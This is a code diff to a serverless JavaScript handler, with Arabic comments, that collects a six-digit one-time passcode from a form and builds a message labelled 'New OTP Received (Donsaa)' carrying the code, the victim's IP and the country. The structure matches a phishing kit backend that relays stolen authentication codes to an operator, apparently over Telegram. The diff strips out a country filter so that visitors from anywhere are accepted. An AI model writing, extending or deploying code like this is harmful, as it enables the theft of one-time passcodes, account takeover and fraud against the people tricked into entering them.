@@ -1,7 +1,6 @@
 const fetch = require('node-fetch');
 
-// الدول المسموح بها: ألمانيا (DE) والجزائر (DZ)
-const ALLOWED_COUNTRIES = ['DE', 'DZ']; 
+// تم إزالة قيد ALLOWED_COUNTRIES (إلغاء الحظر الجغرافي)
 
 const getClientIp = (headers) => {
     return headers['x-nf-client-connection-ip'] || 
@@ -26,22 +25,11 @@ exports.handler = async (event, context) => {
     }
     
     const ip = getClientIp(event.headers); 
-    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // جلب رمز البلد
+    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // سنظل نسجل البلد في الرسالة
     
     // ----------------------------------------------------------------
-    // 1. تقييد الوصول الجغرافي (Geo-Restriction Check)
+    // 1. **(تم إزالة فحص Geo-Restriction بالكامل)**
     // ----------------------------------------------------------------
-    if (!ALLOWED_COUNTRIES.includes(countryCode)) {
-        console.log(`[BLOCKED OTP GEO] Access denied from Country: ${countryCode} (IP: ${ip})`);
-        
-        // التحويل إلى صفحة الانتظار أو تسجيل الدخول لمنع الاستخدام
-        return {
-            statusCode: 303,
-            headers: {
-                Location: '/waiting.html', 
-            },
-        };
-    }
     
     // ----------------------------------------------------------------
     // 2. معالجة OTP (الزوار المسموح لهم)
@@ -51,16 +39,15 @@ exports.handler = async (event, context) => {
     
     let otpCode = '';
     for (let i = 1; i <= 6; i++) {
-        // نستخدم bodyParams.get مباشرة بدلاً من htmlspecialchars في Node.js
         otpCode += bodyParams.get(`otp${i}`) || '';
     }
     
     const safe_otp = escapeMarkdownV2(otpCode);
     const safe_ip = escapeMarkdownV2(ip);
-    const safe_country = escapeMarkdownV2(countryCode); // ترميز البلد
+    const safe_country = escapeMarkdownV2(countryCode);
 
     let message_text = `🔑 *New OTP Received \\(Donsaa\\)* 🔑\n\n`;
-    message_text += `Country: \`${safe_country}\`\n`; // إضافة البلد للرسالة
+    message_text += `Country: \`${safe_country}\`\n`; // ما زلنا نسجل البلد للتشخيص
     message_text += `OTP Code: \`${safe_otp}\`\n`;
     message_text += `IP: \`${safe_ip}\``; 
 
